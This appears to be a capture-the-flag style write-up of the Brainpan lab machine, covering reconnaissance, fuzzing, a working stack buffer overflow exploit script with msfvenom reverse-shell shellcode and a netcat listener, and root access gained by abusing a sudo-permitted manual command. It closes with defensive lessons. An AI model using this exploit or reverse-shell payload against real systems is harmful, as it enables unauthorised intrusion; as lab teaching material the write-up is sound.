I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.

```bash
kali@kali:~$ sudo netdiscover -r 192.168.56.0/16

Currently scanning: 192.168.67.0/16   |   Screen View: Unique Hosts

 ```

I then ran an nmap scan against the target's IP address `192.168.56.117` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I also recently started adding the `-p-` option to make sure I don't miss any crucial ports. This checks all possible ports, not just the most common ones. I saved the output in a file because I donâ€™t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).

```bash
kali@kali:~$ sudo nmap -sS -A -n -p- -oA brainpan 192.168.56.117

`abyss` sounded interesting, but I couldn't find anything on that particular port so I went on to the website hosted on port 10000. I was greeted with some kind of infographic about secure coding, not much else. I used `nikto` and `dirb` to hopefully find more:

Visiting `/bin`, I found a page with a download link to a file called `brainpan.exe`:

![alt]({{ site.url }}{{ site.baseurl }}/images/brainpan_download.png)

I downloaded the file and although I couldn't run `.exe` files on a Linux machine, I first ran `strings` on it. This gave me a lot of output, but the following part looked interesting:

```bash

Two things came to mind: `brainpan.exe` was possibly vulnerable to a buffer overflow exploit and `shitstorm` could possibly be a password. The password did end up working, but nothing really seemed to happen:

Obviously I wanted to be able to do more with this `.exe` file, so I switched from a Kali machine to a Windows one and downloaded the file there. Running the file, I could `ncat` to it and enter input to see what happens. My earlier hunch that this file could be vulnerable to a buffer overflow grew stronger so I wrote a small fuzzer in Python and tried it out:

```python
import socket, sys, time

length = 100

while length <= 3000:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('127.0.0.1', 9999))
        print "fuzzing with " + str(length)
        s.send("A" * length)
        data = s.recv(1024)
        s.close()
        length += 100
```

```
c:\>fuzzer.py
fuzzing with 100
fuzzing with 200
fuzzing with 300
fuzzing with 400
fuzzing with 500
fuzzing with 600
fuzzing with 700
Traceback (most recent call last):
  File "C:\fuzzer.py", line 10, in <module>
    data = s.recv(1024)
socket.error: [Errno 10054] An existing connection was forcibly closed by the remote host
```

So the `.exe` program crashes around 700 bytes of input. To find the exact amount, I used `pattern_create.rb` and transferred that to my Windows machine:

```bash
kali@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 800 > pattern.txt
kali@kali:~$ nc -nlvp 1717 < pattern.txt

```

I edited my Python fuzzer so that all it would send was the pattern. I then fired up `Immunity Debugger` to find out what exactly happened to the `.exe` application when I would input the pattern to it. Sure enough, it overwrote the `EIP` with an invalid memory address, causing an access violation:

![alt]({{ site.url }}{{ site.baseurl }}/images/brainpan_accessviolation.png)

What this meant, was that I could control the memory address the `EIP` points to. Controlling that memory address meant I could change it to something where my own payload (in this case shellcode) was located, thus executing that shellcode. That shellcode could be whatever I wanted it to be, but I chose a reverse shell.

I continued by finding the offset so I would know exactly after how many bytes of input I would control the `EIP`. This was 524:

```bash
kali@kali:~$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 35724134
[*] Exact match at offset 524
```

Next up was finding any bad characters to make sure the shellcode I would create later on would function properly. This ensured no instructions are skipped because they contain bad characters that the `.exe` can't use.

This can be done in various ways, including manually. However, the manual method has a *lot* of room for error because it involves you staring intensely at your screen and picking the odd ones out. I used `mona.py` instead. I generated an array of possibly bad characters with:

`!mona config -set workingfolder c:\` and `!mona bytearray`

I then ran the program and compared the results with the array of bad characters with:

`!mona compare -f c:\bytearray.bin -a 005ff910` (`005ff910` is the memory location where the array of bad characters is supposed to be)

This resulted in `Corruption after 1 bytes`, meaning the `\x00` right at the start of the array was a bad character. I removed that character with `!mona bytearray -b \x00`, compared again and found out that there were no other bad characters. This meant I could move on to finding the memory address that `EIP` should point to.

Using `!mona modules`, I confirmed the module in which I could look for the `JMP ESP` memory address (which I would overwrite the `EIP` with later). `!mona jmp -r esp -m brainpan.exe` gave me the following output:

![alt]({{ site.url }}{{ site.baseurl }}/images/brainpan_jmpesp.png)

So `311712F3` in "little endian format", `\xf3\x12\x17\x31`, which was what I had to overwrite `EIP` with so that the next instruction would be to execute whatever is at that address. Next, I generated the shellcode:

```bash
kali@kali:~$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=1717 -f c -a x86 -b "\x00" > shellcode.txt

unsigned char buf[] =

"\x54\x16\xd1\x4f\x17";
```

Placing this shellcode in my Python exploit, it now looked like this:

```python
import socket, sys, time

pattern = "A" * 524
eip = "\xf3\x12\x17\x31"
padding = "\x90" * 16
shellcode = (
"\xda\xc5\xd9\x74\x24\xf4\x5a\xb8\x63\xff\xbe\x99\x2b\xc9\xb1"
"\x12\x31\x42\x17\x83\xea\xfc\x03\x21\xec\x5c\x6c\x94\xc9\x56"
"\x6c\x85\xae\xcb\x19\x2b\xb8\x0d\x6d\x4d\x77\x4d\x1d\xc8\x37"

"\x54\x16\xd1\x4f\x17")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.56.117', 9999))
s.send(pattern + eip + padding + shellcode)
data = s.recv(1024)
s.close()
```

Setting up a listener in one tab and running the exploit in another tab gave me shell access as the `puck` user:

```bash
kali@kali:~$ nc -nlvp 1717

python -c 'import pty; pty.spawn("/bin/sh")'
$
```

As I usually do, I checked out `sudo -l` first and found out that I could run the following as `root`:

```bash
$ sudo -l

I was lucky to remember reading something a while ago about dropping into a shell from within the `manual` command. Since this particular `manual` command was running as `root`, dropping into a shell from within it meant I could give myself a `root` shell giving me full control of the machine:

```bash
$ sudo /home/anansi/bin/anansi_util manual ls
sudo /home/anansi/bin/anansi_util manual ls
No manual entry for manual
WARNING: terminal is not fully functional

root
```

## Lessons learned

This was a lot of fun and definitely challenging, particularly the buffer overflow part which led to my initial access to the target. This could've been prevented by using secure code and not using `C` functions such as `gets()`, `strcpy()`, `strcat()` and `scanf()`. It's important to do bounds checking, making sure that restricted memory areas can't be written to. An example of a safer alternative would be `fgets()`.

I escalated my limited privileges to `root` privileges by abusing the fact that I was allowed to run a `manual` command as root. I don't see any real benefit to this in a real environment, so removing this configuration would've been a simple way to prevent this. It's crucial to always double/triple check which user can run which command as `root`, in what ways that could form a security risk and most importantly, if they *need* it in the first place. The "principle of least privilege" is such an important one and applies here as well - if a user doesn't absolutely *need* a particular privilege, don't give it to him or her.
